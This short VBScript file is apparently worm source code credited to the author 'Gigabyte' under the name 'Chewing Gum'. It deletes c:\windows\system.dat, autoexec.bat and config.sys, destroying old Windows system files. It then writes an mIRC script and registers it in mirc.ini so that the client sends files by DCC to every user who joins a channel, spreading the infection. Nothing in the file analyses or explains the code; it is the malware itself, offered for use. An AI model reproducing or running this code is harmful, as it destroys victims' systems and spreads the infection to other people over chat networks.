On Error Resume Next
Dim fso, f
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.GetFile("c:\windows\system.dat")
f.attributes = f.attributes - 1

dim a
Set fso = CreateObject("Scripting.FileSystemObject")
Set a = fso.GetFile("c:\windows\system.dat")
a.Delete

Dim fsi, d
Set fsi = CreateObject("Scripting.FileSystemObject")
Set d = fsi.GetFile("c:\autoexec.bat")
d.Delete

Dim fsj, e
Set fsj = CreateObject("Scripting.FileSystemObject")
Set e = fsj.GetFile("c:\config.sys")
e.Delete

dim b
Set fso = CreateObject("Scripting.FileSystemObject")
Set b = fso.CreateTextFile("c:\mirc\gum.mrc", True)
b.WriteLine "ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
b.WriteLine "/dcc send $nick c:\mirc\download\gum.html"
b.WriteLine "/dcc send $nick c:\mirc\download\gum.gif"
b.WriteLine "}"
b.close

' Thanks Knowdeth for letting me use this, from VBS/mIRC/pIRCH.WelcomB.a :-)

Const ForReading = 1, ForWriting = 2, ForAppending = 8
Set f = fso.OpenTextFile("c:\mirc\mirc.ini", ForAppending, True)
f.WriteLine "n3=c:\mirc\gum.mrc"
f.Close

' Chewing Gum is written by Gigabyte..enjoy